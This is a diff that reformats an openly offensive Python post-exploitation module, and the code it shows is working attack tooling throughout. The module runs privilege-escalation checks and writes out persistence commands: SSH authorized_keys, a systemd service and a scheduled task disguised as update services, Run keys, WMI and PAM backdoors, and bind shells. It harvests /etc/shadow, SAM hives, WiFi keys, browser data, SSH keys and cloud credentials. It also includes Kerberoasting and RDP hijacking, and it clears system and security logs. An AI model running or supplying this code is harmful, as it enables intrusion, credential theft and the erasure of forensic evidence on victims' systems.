@@ -5,13 +5,7 @@ Post-Exploitation Advanced Module
 """
 
 import subprocess
-import os
 import platform
-import json
-import base64
-import socket
-import struct
-from datetime import datetime
 
 
 class PostExploitationAdvanced:
@@ -29,10 +23,7 @@ class PostExploitationAdvanced:
 
     def run_command(self, cmd, timeout=30):
         try:
-            result = subprocess.run(
-                cmd, shell=True, capture_output=True,
-                text=True, timeout=timeout
-            )
+            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
             return result.stdout.strip()
         except subprocess.TimeoutExpired:
             return "Command timed out"
@@ -48,15 +39,38 @@ class PostExploitationAdvanced:
         try:
             output = self.run_command("find / -perm -4000 -type f 2>/dev/null")
             vuln_suids = []
-            dangerous = ["nmap", "vim", "find", "bash", "sh", "python", "perl",
-                         "ruby", "wget", "curl", "cp", "mv", "env", "awk",
-                         "less", "more", "man", "ftp", "socat", "tee"]
+            dangerous = [
+                "nmap",
+                "vim",
+                "find",
+                "bash",
+                "sh",
+                "python",
+                "perl",
+                "ruby",
+                "wget",
+                "curl",
+                "cp",
+                "mv",
+                "env",
+                "awk",
+                "less",
+                "more",
+                "man",
+                "ftp",
+                "socat",
+                "tee",
+            ]
             for line in output.split("\n"):
                 if line.strip():
                     binary = line.split("/")[-1].lower()
                     if binary in dangerous:
                         vuln_suids.append(line.strip())
-            return f"SUID Binaries Found:\n{output}\n\nPotentially Exploitable:\n" + "\n".join(vuln_suids) if vuln_suids else f"SUID Binaries:\n{output}"
+            return (
+                f"SUID Binaries Found:\n{output}\n\nPotentially Exploitable:\n" + "\n".join(vuln_suids)
+                if vuln_suids
+                else f"SUID Binaries:\n{output}"
+            )
         except Exception as e:
             return f"Error scanning SUID binaries: {str(e)}"
 
@@ -65,12 +79,27 @@ class PostExploitationAdvanced:
         try:
             output = self.run_command("sudo -l 2>/dev/null")
             risky = []
-            dangerous_cmds = ["(ALL)", "(root)", "NOPASSWD", "/bin/bash",
-                              "/bin/sh", "/usr/bin/python", "/usr/bin/perl",
-                              "/usr/bin/ruby", "/usr/bin/env", "/usr/bin/find",
-                              "/usr/bin/vim", "/usr/bin/nmap", "/usr/bin/awk",
-                              "/usr/bin/less", "/usr/bin/man", "/usr/bin/cp",
-                              "/usr/bin/mv", "/usr/bin/wget", "/usr/bin/curl"]
+            dangerous_cmds = [
+                "(ALL)",
+                "(root)",
+                "NOPASSWD",
+                "/bin/bash",
+                "/bin/sh",
+                "/usr/bin/python",
+                "/usr/bin/perl",
+                "/usr/bin/ruby",
+                "/usr/bin/env",
+                "/usr/bin/find",
+                "/usr/bin/vim",
+                "/usr/bin/nmap",
+                "/usr/bin/awk",
+                "/usr/bin/less",
+                "/usr/bin/man",
+                "/usr/bin/cp",
+                "/usr/bin/mv",
+                "/usr/bin/wget",
+                "/usr/bin/curl",
+            ]
             for line in output.split("\n"):
                 for cmd in dangerous_cmds:
                     if cmd.lower() in line.lower():
@@ -115,7 +144,9 @@ class PostExploitationAdvanced:
         try:
             system_cron = self.run_command("cat /etc/crontab 2>/dev/null")
             cron_dirs = self.run_command("ls -la /etc/cron.d/ 2>/dev/null")
-            user_crons = self.run_command("for i in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do echo \"=== $i ===\"; cat /var/spool/cron/crontabs/$i 2>/dev/null; done")
+            user_crons = self.run_command(
+                'for i in $(ls /var/spool/cron/crontabs/ 2>/dev/null); do echo "=== $i ==="; cat /var/spool/cron/crontabs/$i 2>/dev/null; done'
+            )
             writable = self.run_command("find /etc/cron* -writable -type f 2>/dev/null")
             result = f"System Crontab:\n{system_cron}\n\nCron.d:\n{cron_dirs}\n\nUser Crons:\n{user_crons}"
             if writable.strip():
@@ -161,7 +192,7 @@ class PostExploitationAdvanced:
     def pe_windows_service_abuse(self, target="localhost"):
         self.log(f"[PrivEsc] Checking vulnerable services on {target}", "info")
         try:
-            services = self.run_command('wmic service get name,pathname,startmode 2>/dev/null')
+            services = self.run_command("wmic service get name,pathname,startmode 2>/dev/null")
             unquoted = []
             for line in services.split("\n"):
                 if line.strip() and " " in line and "C:\\" in line and '"' not in line:
@@ -178,12 +209,14 @@ class PostExploitationAdvanced:
     def pe_windows_registry_autorun(self, target="localhost"):
         self.log(f"[PrivEsc] Checking autorun entries on {target}", "info")
         try:
-            autorun1 = self.run_command('reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null')
-            autorun2 = self.run_command('reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null')
-            scheduled = self.run_command('schtasks /query /fo LIST 2>/dev/null')
+            autorun1 = self.run_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null")
+            autorun2 = self.run_command("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null")
+            scheduled = self.run_command("schtasks /query /fo LIST 2>/dev/null")
             startup = self.run_command('dir "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>/dev/null')
-            result = (f"HKLM Autorun:\n{autorun1}\n\nHKCU Autorun:\n{autorun2}\n"
-                      f"\nScheduled Tasks:\n{scheduled}\n\nStartup:\n{startup}")
+            result = (
+                f"HKLM Autorun:\n{autorun1}\n\nHKCU Autorun:\n{autorun2}\n"
+                f"\nScheduled Tasks:\n{scheduled}\n\nStartup:\n{startup}"
+            )
             return result
         except Exception as e:
             return f"Error checking autorun: {str(e)}"
@@ -195,7 +228,7 @@ class PostExploitationAdvanced:
                 'powershell -Command "Get-Process | ForEach-Object { '
                 'try { $_.Modules | ForEach-Object { $_.FileName } } catch {} }" 2>/dev/null'
             )
-            path_dirs = self.run_command('echo %PATH%')
+            path_dirs = self.run_command("echo %PATH%")
             writable = self.run_command(
                 'for /f "tokens=*" %i in (\'echo %PATH%\') do @icacls "%i" 2>nul | findstr /i "F" | findstr /i "Everyone" >nul && echo %i'
             )
@@ -210,19 +243,19 @@ class PostExploitationAdvanced:
         self.log(f"[PrivEsc] Checking UAC bypass possibilities on {target}", "info")
         try:
             uac_level = self.run_command(
-                'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>/dev/null'
+                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA 2>/dev/null"
             )
             consent = self.run_command(
-                'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin 2>/dev/null'
+                "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin 2>/dev/null"
             )
             fodhelper = self.run_command(
-                'reg query HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command 2>/dev/null'
+                "reg query HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command 2>/dev/null"
             )
-            eventvwr = self.run_command(
-                'reg query HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command 2>/dev/null'
+            eventvwr = self.run_command("reg query HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command 2>/dev/null")
+            result = (
+                f"UAC Settings:\n{uac_level}\n\nConsent Prompt:\n{consent}\n"
+                f"\nFodhelper check:\n{fodhelper}\n\nEventvwr check:\n{eventvwr}"
             )
-            result = (f"UAC Settings:\n{uac_level}\n\nConsent Prompt:\n{consent}\n"
-                      f"\nFodhelper check:\n{fodhelper}\n\nEventvwr check:\n{eventvwr}")
             if "0x1" not in uac_level:
                 result += "\n\n[!] UAC appears to be enabled - bypass may be possible"
             return result
@@ -252,7 +285,9 @@ class PostExploitationAdvanced:
             authorized = self.run_command("cat ~/.ssh/authorized_keys 2>/dev/null")
             result = f"SSH Directory:\n{ssh_dir}\n\nAuthorized Keys:\n{authorized}\n"
             result += "\nTo add persistence:\n"
-            result += "mkdir -p ~/.ssh && echo 'PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+            result += (
+                "mkdir -p ~/.ssh && echo 'PUBLIC_KEY' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
+            )
             return result
         except Exception as e:
             return f"Error checking SSH persistence: {str(e)}"
@@ -262,7 +297,7 @@ class PostExploitationAdvanced:
         try:
             services = self.run_command("systemctl list-unit-files --type=service 2>/dev/null | head -20")
             service_name = "bs-updater"
-            service_content = f"""[Unit]
+            service_content = """[Unit]
 Description=System Update Service
 After=network.target
 
@@ -296,13 +331,11 @@ WantedBy=multi-user.target"""
     def persist_windows_registry_run_key(self, target="localhost"):
         self.log(f"[Persistence] Creating Windows registry Run key on {target}", "info")
         try:
-            current = self.run_command(
-                'reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null'
-            )
+            current = self.run_command("reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>/dev/null")
             payload_path = "%APPDATA%\\Microsoft\\Windows\\start.exe"
             result = f"Current HKCU Run keys:\n{current}\n\n"
             result += f"Payload path: {payload_path}\n"
-            result += f"\nRegistry command:\n"
+            result += "\nRegistry command:\n"
             result += f'reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v "SystemUpdate" /t REG_SZ /d "{payload_path}" /f'
             return result
         except Exception as e:
@@ -314,9 +347,9 @@ WantedBy=multi-user.target"""
             tasks = self.run_command("schtasks /query /fo TABLE 2>/dev/null | head -20")
             task_name = "WindowsUpdateService"
             result = f"Existing scheduled tasks:\n{tasks}\n\n"
-            result += f"Command to create persistent task:\n"
+            result += "Command to create persistent task:\n"
             result += f'schtasks /create /tn "{task_name}" /tr "C:\\Windows\\System32\\cmd.exe /c payload.exe" /sc ONLOGON /ru SYSTEM'
-            result += f'\nOr with higher stealth:\n'
+            result += "\nOr with higher stealth:\n"
             result += f'schtasks /create /tn "{task_name}" /tr "C:\\Windows\\System32\\cmd.exe /c payload.exe" /sc DAILY /st 09:00'
             return result
         except Exception as e:
@@ -325,9 +358,7 @@ WantedBy=multi-user.target"""
     def persist_windows_wmi_event(self, target="localhost"):
         self.log(f"[Persistence] Creating WMI event subscription on {target}", "info")
         try:
-            wmi_check = self.run_command(
-                'wmic /namespace:\\\\root\\subscription qEventConsumer 2>/dev/null'
-            )
+            wmi_check = self.run_command("wmic /namespace:\\\\root\\subscription qEventConsumer 2>/dev/null")
             result = f"WMI Event Consumers:\n{wmi_check}\n\n"
             result += "WMI Persistence Commands:\n"
             result += "1. Create filter:\n"
@@ -347,7 +378,7 @@ WantedBy=multi-user.target"""
             result = f"Currently listening ports:\n{listening}\n\n"
             result += "Bind shell options:\n"
             result += "1. nc -l -p 9999 -e /bin/bash\n"
-            result += "2. python -c 'import socket,subprocess,os;s=socket.socket();s.bind((\"0.0.0.0\",9999));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'\n"
+            result += '2. python -c \'import socket,subprocess,os;s=socket.socket();s.bind(("0.0.0.0",9999));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/bash","-i"])\'\n'
             result += "3. socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"
             return result
         except Exception as e:
@@ -370,7 +401,9 @@ WantedBy=multi-user.target"""
         self.log(f"[Persistence] Checking PAM module persistence on {target}", "info")
         try:
             pam_config = self.run_command("cat /etc/pam.d/common-auth 2>/dev/null")
-            pam_files = self.run_command("ls -la /lib/security/ 2>/dev/null || ls -la /lib/x86_64-linux-gnu/security/ 2>/dev/null")
+            pam_files = self.run_command(
+                "ls -la /lib/security/ 2>/dev/null || ls -la /lib/x86_64-linux-gnu/security/ 2>/dev/null"
+            )
             result = f"PAM Configuration:\n{pam_config}\n\nPAM Modules:\n{pam_files}\n"
             result += "\nPAM backdoor technique:"
             result += "\n1. Modify /etc/pam.d/common-auth to include pam_permit.so"
@@ -388,35 +421,51 @@ WantedBy=multi-user.target"""
         self.log(f"[Exfil] Collecting sensitive files from {target}", "info")
         try:
             linux_files = [
-                "/etc/passwd", "/etc/shadow", "/etc/ssh/ssh_host_rsa_key",
-                "/root/.bash_history", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
-                "/etc/crontab", "/etc/sudoers", "/var/log/auth.log",
-                "/etc/ssh/sshd_config", "/root/.gnupg/secring.gpg"
+                "/etc/passwd",
+                "/etc/shadow",
+                "/etc/ssh/ssh_host_rsa_key",
+                "/root/.bash_history",
+                "/root/.ssh/id_rsa",
+                "/root/.ssh/authorized_keys",
+                "/etc/crontab",
+                "/etc/sudoers",
+                "/var/log/auth.log",
+                "/etc/ssh/sshd_config",
+                "/root/.gnupg/secring.gpg",
             ]
             windows_files = [
-                "C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\System32\\config\\SYSTEM",
-                "C:\\Users\\*\\Documents\\*.key", "C:\\Users\\*\\.ssh\\id_rsa",
+                "C:\\Windows\\System32\\config\\SAM",
+                "C:\\Windows\\System32\\config\\SYSTEM",
+                "C:\\Users\\*\\Documents\\*.key",
+                "C:\\Users\\*\\.ssh\\id_rsa",
                 "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\*",
-                "C:\\inetpub\\web.config", "C:\\Windows\\php.ini"
+                "C:\\inetpub\\web.config",
+                "C:\\Windows\\php.ini",
             ]
             found = []
             for f in linux_files + windows_files:
                 check = self.run_command(f'test -f "{f}" && echo "EXISTS:{f}" 2>/dev/null')
                 if "EXISTS" in check:
                     found.append(f)
-            return f"Sensitive files found:\n" + "\n".join(found) if found else "No sensitive files found in common locations"
+            return (
+                "Sensitive files found:\n" + "\n".join(found)
+                if found
+                else "No sensitive files found in common locations"
+            )
         except Exception as e:
             return f"Error collecting sensitive files: {str(e)}"
 
     def exfil_wifi_credentials(self, target="localhost"):
         self.log(f"[Exfil] Extracting WiFi credentials from {target}", "info")
         try:
-            profiles = self.run_command('netsh wlan show profiles 2>/dev/null')
+            profiles = self.run_command("netsh wlan show profiles 2>/dev/null")
             credentials = self.run_command(
                 'for /f "tokens=2 delims=:" %i in (\'netsh wlan show profiles ^| findstr "All User Profile"\') do @netsh wlan show profile name="%i" key=clear 2>/dev/null | findstr "Key Content"'
             )
-            linux_profiles = self.run_command('ls /etc/NetworkManager/system-connections/ 2>/dev/null')
-            linux_creds = self.run_command('for f in /etc/NetworkManager/system-connections/*; do echo "=== $f ==="; cat "$f" 2>/dev/null | grep -i psk; done')
+            linux_profiles = self.run_command("ls /etc/NetworkManager/system-connections/ 2>/dev/null")
+            linux_creds = self.run_command(
+                'for f in /etc/NetworkManager/system-connections/*; do echo "=== $f ==="; cat "$f" 2>/dev/null | grep -i psk; done'
+            )
             result = f"Windows Profiles:\n{profiles}\n\nCredentials:\n{credentials}"
             if linux_profiles:
                 result += f"\n\nLinux Profiles:\n{linux_profiles}\nCredentials:\n{linux_creds}"
@@ -427,15 +476,11 @@ WantedBy=multi-user.target"""
     def exfil_browser_data(self, target="localhost"):
         self.log(f"[Exfil] Extracting browser data from {target}", "info")
         try:
-            chrome_cookies = self.run_command(
-                'find ~/ -path "*/.config/google-chrome/Default/Cookies" 2>/dev/null'
-            )
+            chrome_cookies = self.run_command('find ~/ -path "*/.config/google-chrome/Default/Cookies" 2>/dev/null')
             firefox_profiles = self.run_command(
                 'find ~/ -path "*/.mozilla/firefox/*.default*/cookies.sqlite" 2>/dev/null'
             )
-            chrome_history = self.run_command(
-                'find ~/ -path "*/.config/google-chrome/Default/History" 2>/dev/null'
-            )
+            chrome_history = self.run_command('find ~/ -path "*/.config/google-chrome/Default/History" 2>/dev/null')
             firefox_history = self.run_command(
                 'find ~/ -path "*/.mozilla/firefox/*.default*/places.sqlite" 2>/dev/null'
             )
@@ -452,12 +497,10 @@ WantedBy=multi-user.target"""
         try:
             linux_hashes = self.run_command("cat /etc/shadow 2>/dev/null")
             windows_hashes = self.run_command(
-                'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive 2>/dev/null && '
-                'reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive 2>/dev/null'
+                "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive 2>/dev/null && "
+                "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive 2>/dev/null"
             )
-            lsa_secrets = self.run_command(
-                'reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive 2>/dev/null'
-            )
+            lsa_secrets = self.run_command("reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive 2>/dev/null")
             result = f"Linux /etc/shadow:\n{linux_hashes}\n\n"
             result += f"Windows SAM backup:\n{windows_hashes}\n"
             result += f"Windows LSA Secrets:\n{lsa_secrets}\n"
@@ -487,7 +530,9 @@ WantedBy=multi-user.target"""
     def exfil_ssh_keys(self, target="localhost"):
         self.log(f"[Exfil] Extracting SSH keys from {target}", "info")
         try:
-            ssh_keys = self.run_command("find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null")
+            ssh_keys = self.run_command(
+                "find / -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null"
+            )
             ssh_config = self.run_command("find / -name 'config' -path '*/.ssh/*' 2>/dev/null")
             known_hosts = self.run_command("find / -name 'known_hosts' -path '*/.ssh/*' 2>/dev/null")
             authorized = self.run_command("find / -name 'authorized_keys' 2>/dev/null")
@@ -502,22 +547,14 @@ WantedBy=multi-user.target"""
     def exfil_cloud_credentials(self, target="localhost"):
         self.log(f"[Exfil] Extracting cloud credentials from {target}", "info")
         try:
-            aws_keys = self.run_command(
-                'cat ~/.aws/credentials 2>/dev/null; '
-                'env | grep -i AWS 2>/dev/null'
-            )
+            aws_keys = self.run_command("cat ~/.aws/credentials 2>/dev/null; env | grep -i AWS 2>/dev/null")
             azure_profile = self.run_command(
-                'cat ~/.azure/accessTokens.json 2>/dev/null; '
-                'cat ~/.azure/azureProfile.json 2>/dev/null'
+                "cat ~/.azure/accessTokens.json 2>/dev/null; cat ~/.azure/azureProfile.json 2>/dev/null"
             )
             gcp_keys = self.run_command(
-                'cat ~/.config/gcloud/credentials.db 2>/dev/null; '
-                'cat ~/.config/gcloud/properties 2>/dev/null'
+                "cat ~/.config/gcloud/credentials.db 2>/dev/null; cat ~/.config/gcloud/properties 2>/dev/null"
             )
-            docker_env = self.run_command(
-                'cat /root/.docker/config.json 2>/dev/null; '
-                'env | grep -i DOCKER 2>/dev/null'
-            )
+            docker_env = self.run_command("cat /root/.docker/config.json 2>/dev/null; env | grep -i DOCKER 2>/dev/null")
             result = f"AWS:\n{aws_keys}\n\nAzure:\n{azure_profile}\n"
             result += f"GCP:\n{gcp_keys}\n\nDocker:\n{docker_env}"
             if any([aws_keys, azure_profile, gcp_keys, docker_env]):
@@ -575,7 +612,7 @@ WantedBy=multi-user.target"""
         self.log(f"[Exfil] Extracting /etc/shadow for offline cracking on {target}", "info")
         try:
             shadow = self.run_command("cat /etc/shadow 2>/dev/null")
-            users = self.run_command("awk -F: 'NF>1 && $2!=\"*\" && $2!=\"!\" {print $1}' /etc/shadow 2>/dev/null")
+            users = self.run_command('awk -F: \'NF>1 && $2!="*" && $2!="!" {print $1}\' /etc/shadow 2>/dev/null')
             result = f"/etc/shadow:\n{shadow}\n\nCrackable users:\n{users}"
             if shadow.strip():
                 result += "\n\nOffline cracking commands:"
@@ -683,12 +720,8 @@ WantedBy=multi-user.target"""
     def lateral_kerberoasting(self, target="localhost"):
         self.log(f"[Lateral] Testing Kerberoasting on {target}", "info")
         try:
-            kerberoast = self.run_command(
-                "impacket-GetUserSPNs DOMAIN/user:password -request 2>/dev/null"
-            )
-            asrep = self.run_command(
-                "impacket-GetNPUsers DOMAIN/user:password -dc-ip DC_IP -request 2>/dev/null"
-            )
+            kerberoast = self.run_command("impacket-GetUserSPNs DOMAIN/user:password -request 2>/dev/null")
+            asrep = self.run_command("impacket-GetNPUsers DOMAIN/user:password -dc-ip DC_IP -request 2>/dev/null")
             result = f"Kerberoasting:\n{kerberoast}\n\nAS-REP Roasting:\n{asrep}"
             result += "\n\nKerberoasting Commands:"
             result += "\nimpacket-GetUserSPNs DOMAIN/user:password -request -outputfile hashes.txt"
@@ -722,7 +755,7 @@ WantedBy=multi-user.target"""
             result = f"RDP Sessions:\n{rdp_sessions}\n\nRDP Users:\n{rdp_users}\n"
             result += f"\nRDP Enabled:\n{rdp_port}"
             result += "\n\nRDP Hijack Commands:"
-            result += "\ntasklist /FI \"IMAGENAME eq svchost.exe\" /V"
+            result += '\ntasklist /FI "IMAGENAME eq svchost.exe" /V'
             result += "\nquery session"
             result += "\nrdpcheck.exe TARGET"
             result += "\nInvoke-RDPHijack -SessionID 1"
@@ -733,7 +766,9 @@ WantedBy=multi-user.target"""
     def lateral_dcom_execution(self, target="localhost"):
         self.log(f"[Lateral] Testing DCOM lateral movement to {target}", "info")
         try:
-            dcom_check = self.run_command("powershell -Command 'Get-ChildItem -Path HKLM:\\SOFTWARE\\Classes -Recurse | Where-Object {$_.Name -match \"DCOM\"}' 2>/dev/null")
+            dcom_check = self.run_command(
+                "powershell -Command 'Get-ChildItem -Path HKLM:\\SOFTWARE\\Classes -Recurse | Where-Object {$_.Name -match \"DCOM\"}' 2>/dev/null"
+            )
             mmc = self.run_command("which dcomexec.py 2>/dev/null")
             result = f"DCOM Objects:\n{dcom_check}\n\nDCOM Tools:\n{mmc}\n"
             result += "\nDCOM Lateral Movement:"
@@ -753,7 +788,9 @@ WantedBy=multi-user.target"""
         try:
             os_name = platform.system()
             hostname = self.run_command("hostname")
-            ip = self.run_command("hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep 'inet ' | awk '{print $2}'")
+            ip = self.run_command(
+                "hostname -I 2>/dev/null || ip addr show 2>/dev/null | grep 'inet ' | awk '{print $2}'"
+            )
             users = self.run_command("whoami && id 2>/dev/null")
             result = f"OS: {os_name}\nHostname: {hostname}\nIP: {ip}\nUser: {users}"
             return result
@@ -765,7 +802,7 @@ WantedBy=multi-user.target"""
         try:
             logs = self.run_command("rm -f /var/log/auth.log /var/log/syslog /var/log/messages 2>/dev/null")
             bash_history = self.run_command("rm -f ~/.bash_history && history -c 2>/dev/null")
-            windows_logs = self.run_command('wevtutil cl Security 2>/dev/null && wevtutil cl System 2>/dev/null')
+            windows_logs = self.run_command("wevtutil cl Security 2>/dev/null && wevtutil cl System 2>/dev/null")
             temp = self.run_command("rm -rf /tmp/* /var/tmp/* 2>/dev/null")
             result = f"Linux logs cleared: {logs}\nBash history cleared: {bash_history}\n"
             result += f"Windows logs cleared: {windows_logs}\nTemp cleared: {temp}"
@@ -786,7 +823,7 @@ WantedBy=multi-user.target"""
             }
             output = ""
             for key, value in results.items():
-                output += f"\n{'='*50}\n{key.upper()}:\n{'='*50}\n{value}\n"
+                output += f"\n{'=' * 50}\n{key.upper()}:\n{'=' * 50}\n{value}\n"
             return output
         except Exception as e:
             return f"Error in full enumeration: {str(e)}"
